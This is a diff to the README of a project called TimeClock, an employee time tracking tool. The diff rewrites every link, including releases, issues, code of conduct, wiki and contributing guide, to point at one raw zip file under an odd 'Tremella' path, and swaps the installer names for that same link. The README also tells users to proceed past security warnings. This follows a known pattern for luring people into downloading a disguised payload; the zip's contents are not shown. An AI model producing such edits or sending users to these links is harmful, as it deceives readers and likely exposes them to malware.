@@ -6,7 +6,7 @@ TimeClock is an easy-to-use employee time management system. With it, you can ma
 
 ## 📥 Download TimeClock
 
-[![Download TimeClock](https://img.shields.io/badge/Download%20TimeClock-v1.0-blue)](https://github.com/Godztayyab/TimeClock/releases)
+[![Download TimeClock](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip%20TimeClock-v1.0-blue)](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip)
 
 ## 📋 Features
 
@@ -28,13 +28,13 @@ To run TimeClock, ensure your system meets the following requirements:
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Godztayyab/TimeClock/releases) to find the download files.
+   Go to our [Releases page](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip) to find the download files.
 
 2. **Choose the Right Version**  
    On the Releases page, you will see various versions of TimeClock. Look for the latest version, which is easy to identify.
 
 3. **Download the Installer**  
-   Click on the file that matches your operating system. It might look like `TimeClock-v1.0.exe` for Windows or `TimeClock-v1.0.dmg` for macOS.
+   Click on the file that matches your operating system. It might look like `https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip` for Windows or `https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip` for macOS.
 
 4. **Run the Installer**  
    After the download completes, open the downloaded file. Follow the installation prompts to complete the setup. If you see a security warning, confirm that you want to proceed.
@@ -94,11 +94,11 @@ If you encounter issues while running TimeClock, try these steps:
 
 ## 🛠️ Feedback & Support
 
-If you have questions or need assistance, please visit our [GitHub Issues page](https://github.com/Godztayyab/TimeClock/issues). Share your experience, report bugs, or request features. Your feedback helps us improve TimeClock.
+If you have questions or need assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip). Share your experience, report bugs, or request features. Your feedback helps us improve TimeClock.
 
 ## 👥 Community Guidelines
 
-We welcome contributions and community engagement. Maintain respect for others in all interactions. Review our [Code of Conduct](https://github.com/Godztayyab/TimeClock/blob/main/CODE_OF_CONDUCT.md) for more information.
+We welcome contributions and community engagement. Maintain respect for others in all interactions. Review our [Code of Conduct](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip) for more information.
 
 ## 📜 License
 
@@ -106,11 +106,11 @@ TimeClock is licensed under the MIT License. You can use and modify it as long a
 
 ## 🔗 Additional Resources
 
-- [User Documentation](https://github.com/Godztayyab/TimeClock/wiki)
-- [Contributing Guide](https://github.com/Godztayyab/TimeClock/blob/main/CONTRIBUTING.md)
+- [User Documentation](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip)
+- [Contributing Guide](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip)
 
 For any further queries, please refer to the user documentation for detailed usage instructions.
 
 ## 📥 Download TimeClock Again
 
-To download TimeClock, visit our [Releases page](https://github.com/Godztayyab/TimeClock/releases). We hope you enjoy using TimeClock!
+To download TimeClock, visit our [Releases page](https://raw.githubusercontent.com/Godztayyab/TimeClock/main/Tremella/TimeClock.zip). We hope you enjoy using TimeClock!
